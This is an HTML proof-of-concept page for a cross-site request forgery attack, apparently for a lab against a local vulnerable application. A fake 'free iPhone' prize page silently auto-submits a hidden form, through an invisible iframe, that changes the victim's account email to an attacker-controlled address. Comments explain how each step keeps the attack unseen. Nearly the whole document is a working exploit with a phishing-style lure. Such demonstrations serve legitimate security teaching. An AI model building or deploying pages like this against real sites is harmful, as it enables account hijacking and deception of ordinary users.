<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone Winner!</title>
</head>
<body onload="document.forms[0].submit()">
    <!-- 
      This page represents an attacker's website hosted on a completely different domain 
      (e.g., http://evil.com, or just opened as a local file in the victim's browser).
      
      When the victim visits this page, the javascript 'onload' immediately and invisibly 
      submits the hidden form below to the vulnerable application.
    -->
    
    <h1 style="color: red; font-family: sans-serif; text-align: center; margin-top: 50px;">
        Congratulations! You've won a free iPhone!
    </h1>
    <p style="text-align: center; font-family: sans-serif;">
        Processing your prize now... Please do not close this window.
    </p>

    <!-- 
      The form targets the vulnerable endpoint on the victim's application.
      target="hidden_iframe" ensures the browser doesn't visibly redirect the victim, 
      making the attack completely silent.
    -->
    <iframe name="hidden_iframe" style="display:none;"></iframe>
    
    <form action="http://localhost:5000/change-email" method="POST" target="hidden_iframe" style="display: none;">
        <!-- Attacker provides their own email to hijack the victim's account -->
        <input type="hidden" name="new_email" value="attacker@evil.com">
    </form>
</body>
</html>
